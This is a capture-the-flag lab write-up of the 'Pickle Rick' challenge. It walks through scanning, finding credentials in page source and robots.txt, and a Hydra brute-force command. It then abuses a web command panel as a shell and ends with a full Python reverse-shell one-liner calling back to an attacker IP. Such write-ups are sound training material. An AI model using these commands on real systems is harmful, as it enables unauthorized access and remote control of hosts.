# Pickle Rick

Target IP:

<aside>
ðŸ’¡

**10.64.147.169**

</aside>

Now you need to run an nmap scan to see all active services on the host:

nmap -T5 -sCV -p- -Pn -sS --stats-every=3s 10.64.147.169

The result is:

![image.png](image.png)

In this case, the services found are HTTP (80) and SSH (22). First, we focus on the SSH service, so we enter it in search of any clues that may be exposed:

![image.png](image%201.png)

Based on the text, we can deduce that a password is required to log in to a service or section of the website (SSH service or some login panel on the website). In addition, in the image we see that the name "Morty" is mentioned, who may be a potential user. The next step is to review the source code, use whatweb for the site, as well as a dirbuster to search for new directories and a scan with Nikto:

whatweb (to search for technologies present on the website and useful information):

whatweb http://10.64.147.169

![image.png](image%202.png)

nikto (possible exploits or vulnerabilities on the site):

nikto -h http://10.64.147.169

![image.png](image%203.png)

dirbuster:

![image.png](image%204.png)

Source code of the home page:

![image.png](image%205.png)

This results in the discovery of the user in the source code: "R1ckRul3s" and a login directory:

![image.png](image%206.png)

![image.png](image%207.png)

Since we don't have a password as such, we must perform a brute force attack with Hydra. For this, we will use the two possible users: "R1ckRul3s" and "Morty":

hydra -l 'R1ckRul3s' -P /usr/share/wordlists/rockyou.txt 10.64.147.169 http-post-form "/login.php:username=^USER^&password=^PASSWORD^&sub=Login:Invalid username or password" -t 64 -F

No success:

![image.png](image%208.png)

But in the robots file, there is some suspicious text:

![image.png](image%209.png)

A possible password, and when we test them, we find that they are correct: "R1ckRul3s:Wubbalubbadubdub."

![image.png](image%2010.png)

So now we can inspect the site, and within it, in the source code, we find the following:

![image.png](image%2011.png)

It appears to be text encoded in base64, so we decode it as follows:

Which results in another base64:

![image.png](image%2012.png)

and another:

![image.png](image%2013.png)

and another:

![image.png](image%2014.png)

and another:

![image.png](image%2015.png)

and another:

![image.png](image%2016.png)

and another:

![image.png](image%2017.png)

and another:

![image.png](image%2018.png)

until we reach a rabbit hole, so the real exploit is the following (the section where commands can be executed):

![image.png](image%2019.png)

![image.png](image%2020.png)

This allows us to execute commands directly on the host with root permissions, without restrictions, acting as a web shell:

![image.png](image%2021.png)

![image.png](image%2022.png)

![image.png](image%2023.png)

Noting that there is a list of banned commands, we proceed to list users:

![image.png](image%2024.png)

So we use the "getent passwd" variant:

![image.png](image%2025.png)

and we discover the user ubuntu, we can try to view their directory:

![image.png](image%2026.png)

But along the way we find a directory called rick, but there is no user rick, so we will list it as well:

![image.png](image%2027.png)

In the end, it turned out to be a directory created by the root user and contains the second flag:

![image.png](image%2028.png)

Incidentally, we also discover that the word "cat" is banned, so we can replace it with less. With this, we can find the other flags.

In the Ubuntu directory, we find the following:

![image.png](image%2029.png)

File traces: at this point, since we can execute any command, we can create a reverse shell for convenience, as follows (Python was used because the host did not have other tools such as nc):

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.203.116",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

But first, we put ourselves in listening mode:

nc -lvnp 4444

![image.png](image%2030.png)

Now we can comfortably browse the host and, since we have root permissions, we can list its directory and content:

![image.png](image%2031.png)

With this, we finish with the three flags and successfully complete the challenge:

![image.png](image%2032.png)